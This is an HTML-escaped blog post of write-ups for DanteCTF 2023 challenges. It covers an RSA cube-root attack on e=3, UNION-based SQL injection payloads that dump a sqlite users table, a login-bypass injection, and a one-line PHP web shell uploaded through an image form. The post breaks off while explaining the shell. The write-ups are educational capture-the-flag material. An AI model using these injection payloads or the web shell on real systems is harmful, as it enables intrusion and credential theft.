I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2000&quot; target=_blank&gt;DANTECTF 2023&lt;&#x2F;a&gt; which was happened from  02 June to 5 June. I played it with my team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This I got you some SQL Injection tutorials here. These are the writeups for the challenges I solved..&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot;&gt;Crypto&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;small-inscription&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#small-inscription&quot; aria-label=&quot;Anchor link for: small-inscription&quot;&gt;Small Inscription&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;I came across a strange inscription on the gate that connects two circles, but I cannot read the last part. Can you help me?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached files : [SmallInscription.py] [SmallInscription.output]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;SmallInscription.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;bytes_to_long&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;getPrime
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;secret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;FLAG
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(FLAG) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes_to_long&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;There is something reeeally important you should know, the flag is &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;FLAG)
&lt;&#x2F;span&gt;&lt;span&gt;    N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getPrime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getPrime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;    ct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;N)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;{ct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;{N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;SmallInscription.output&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;ct=747861028284745583986165203504322648396510749839398405070811323707600711491863944680330526354962376022146478962637944671170833980881833864618493670661754856280282476606632288562133960228178540799118953209069757642578754327847269832940273765635707176669208611276095564465950147643941533690293945372328223742576232667549253123094054598941291288949397775419176103429124455420699502573739842580940268711628697334920678442711510187864949808113210697096786732976916002133678253353848775265650016864896187184151924272716863071499925744529203583206734774883138969347565787210674308042083803787880001925683349235960512445949
&lt;&#x2F;span&gt;&lt;span&gt;N=20948184905072216948549865445605798631663501453911333956435737119029531982149517142273321144075961800694876109056203145122426451759388059831044529163118093342195028080582365702020138256379699270302368673086923715628087508705525518656689253472590622223905341942685751355443776992006890500774938631896675247850244098414397183590972496171655304801215957299268404242039713841456437577844606152809639584428764129318729971500384064454823140992681760685982999247885351122505154646928804561614506313946302901152432476414517575301827992421830229939161942896560958118364164451179787855749084154517490249401036072261469298158281
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;e=3&lt;&#x2F;code&gt; which is too small for the encryption. There is an attack existed called &lt;code&gt;Low Exponent Attack&lt;&#x2F;code&gt; on RSA when &lt;code&gt;e&lt;&#x2F;code&gt; was small.&lt;&#x2F;p&gt;
&lt;p&gt;When the e=3, we can get the plaintext by finding the &lt;code&gt;cube root&lt;&#x2F;code&gt; of the &lt;code&gt;ct&lt;&#x2F;code&gt;. Because the ciphertext was just the message rised to the e.&lt;&#x2F;p&gt;
&lt;p&gt;There is a catch to note. When &lt;code&gt;pow(m,e)&lt;&#x2F;code&gt; is less than the modulus, we can just calculate the cube root of the &lt;code&gt;ct&lt;&#x2F;code&gt; to get message. If not, we have to find the cube root of &lt;code&gt;(ct+kN)&lt;&#x2F;code&gt; where &lt;code&gt;k&lt;&#x2F;code&gt; is some integer in the field.&lt;&#x2F;p&gt;
&lt;p&gt;As the message in the challenge already about 50 chars, the &lt;code&gt;pow(m,e)&lt;&#x2F;code&gt; might be greater than the &lt;code&gt;N&lt;&#x2F;code&gt;. So, I implemented the second case to get the flag.&lt;&#x2F;p&gt;
&lt;p&gt;solve.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;gmpy2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;iroot
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20948184905072216948549865445605798631663501453911333956435737119029531982149517142273321144075961800694876109056203145122426451759388059831044529163118093342195028080582365702020138256379699270302368673086923715628087508705525518656689253472590622223905341942685751355443776992006890500774938631896675247850244098414397183590972496171655304801215957299268404242039713841456437577844606152809639584428764129318729971500384064454823140992681760685982999247885351122505154646928804561614506313946302901152432476414517575301827992421830229939161942896560958118364164451179787855749084154517490249401036072261469298158281
&lt;&#x2F;span&gt;&lt;span&gt;e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;ct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;747861028284745583986165203504322648396510749839398405070811323707600711491863944680330526354962376022146478962637944671170833980881833864618493670661754856280282476606632288562133960228178540799118953209069757642578754327847269832940273765635707176669208611276095564465950147643941533690293945372328223742576232667549253123094054598941291288949397775419176103429124455420699502573739842580940268711628697334920678442711510187864949808113210697096786732976916002133678253353848775265650016864896187184151924272716863071499925744529203583206734774883138969347565787210674308042083803787880001925683349235960512445949
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;ct
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;iroot&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;ct:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(m)))
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# There is something reeeally important you should know, the flag is DANTE{sM4ll_R00tzz}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DANTE{sM4ll_R00tzz}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#web&quot; aria-label=&quot;Anchor link for: web&quot;&gt;Web&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;dante-barber-shop&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#dante-barber-shop&quot; aria-label=&quot;Anchor link for: dante-barber-shop&quot;&gt;Dante Barber Shop&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Welcome to our renowned barber shop!
&lt;&#x2F;span&gt;&lt;span&gt;Your task, should you choose to accept it, is to uncover hidden information and retrieve the sensitive data that the owners may have left around.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Challenge : https:&#x2F;&#x2F;barbershop.challs.dantectf.it
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The website presents few photos and a login page. Viewing the source code reveals that there is an another image which was not showed in the website.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;img&#x2F;barber2.jpg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Barber Shop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;img&#x2F;barber3.jpg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Barber Shop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;img&#x2F;barber4.jpg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Barber Shop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;img&#x2F;barber5.jpg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Barber Shop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;img&#x2F;barber6.jpg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Barber Shop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;img&#x2F;barber7.jpg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Barber Shop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay the &lt;code&gt;img&#x2F;barber1.jpg&lt;&#x2F;code&gt; was not displayed here. By trying to access it revealed the barber credentials.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;https:&#x2F;&#x2F;barbershop.challs.dantectf.it&#x2F;img&#x2F;barber1.jpg&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dante23&#x2F;dante23_barber1.png&quot; alt=&quot;Barber&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Used &lt;code&gt;barber : dant3barbersh0p_cLIVeSidag&lt;&#x2F;code&gt; to login. A customer database was displayed and a search field was available to search for the entries.&lt;&#x2F;p&gt;
&lt;p&gt;When I searh for &lt;code&gt;&#x27;&lt;&#x2F;code&gt; in the search field a &lt;code&gt;sqlite3&lt;&#x2F;code&gt; error were displayed. So, It was confirmed that the &lt;code&gt;SQL Injection&lt;&#x2F;code&gt; vulnerability in the system.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Then I enumerated the number of columns with the &lt;code&gt;UNION&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Payload &lt;code&gt;&#x27; union select 1,2,3,4--&lt;&#x2F;code&gt; Confirms that there were 4 columns available.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumerating table name&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Payload &lt;code&gt;&#x27; union select 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type = &quot;table&quot;-- &lt;&#x2F;code&gt; returned the column names &lt;code&gt;users,sqlite_sequence,customers&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Selected columns from table&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Payload &lt;code&gt;&#x27; union select 1,sql,3,4 from sqlite_master WHERE type!=&#x27;meta&#x27; AND sql NOT NULL AND name NOT LIKE &#x27;sqlite_%&#x27; AND name=&#x27;users&#x27;--&lt;&#x2F;code&gt; confirms the columns names &lt;code&gt;id,username,password&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;So now we have table name as well as column name, final thing which we need to do is, extraction of data from the desired column which can be performed by simple SQL query.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Payload &lt;code&gt;&#x27;union SELECT 1,username,password,4 FROM users--&lt;&#x2F;code&gt; printed the admin crendentials on the screen.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;admin : nSOrowLIstERiMbrUsHConesueyeadEr&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;When I logged in to the website with admin credentials, the flag was displayed in the admin dashboard.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DANTE{dant3_1s_inj3cting_everyb0dy_aaxxaa}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;dumb-admin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#dumb-admin&quot; aria-label=&quot;Anchor link for: dumb-admin&quot;&gt;Dumb Admin&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;The Admin coded his dashboard by himself. He‚Äôs sure to be a pro coder and he‚Äôs so satisfied about it. Can you make him rethink that?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Challenge : https:&#x2F;&#x2F;dumbadmin.challs.dantectf.it&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The website was a login page. After some failed tries to find crendentials of the source of the website, I tried to use a basic login bypass &lt;code&gt;SQL injection&lt;&#x2F;code&gt; payload.&lt;&#x2F;p&gt;
&lt;p&gt;Username : &lt;code&gt;admin&#x27; 1=1 --&lt;&#x2F;code&gt;
Password : &lt;code&gt;1234&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This payload was worked fine and I was able to login as admin.&lt;&#x2F;p&gt;
&lt;p&gt;The admin page has a option to upload a image.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dante23&#x2F;dante23_dubm1.png&quot; alt=&quot;dumb&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I thought that there might be a &lt;code&gt;File upload&lt;&#x2F;code&gt; vulnerability in the website.&lt;&#x2F;p&gt;
&lt;p&gt;First uploaded a jpg of 2 kb and it was rendered in the webpage. When I view the source code, I found a direct url to the image uploaded.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;https:&#x2F;&#x2F;dumbadmin.challs.dantectf.it&#x2F;f9bbbecb61014db8f0674bf60c27e668&#x2F;8347dc6bbcfb8d457453656ae33181d7.png&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, If we upload a php file we can execute in by going to the actual URL.&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;php&lt;&#x2F;code&gt; file &lt;code&gt;file.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;&amp;lt;?php &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;($_GET[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;cmd&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;What this code will do is, This can execute the commands passed in the &lt;code&gt;cmd&lt;&#x2F;code&gt; argument in the URL of the file.php&lt;&#x2F;p&gt;
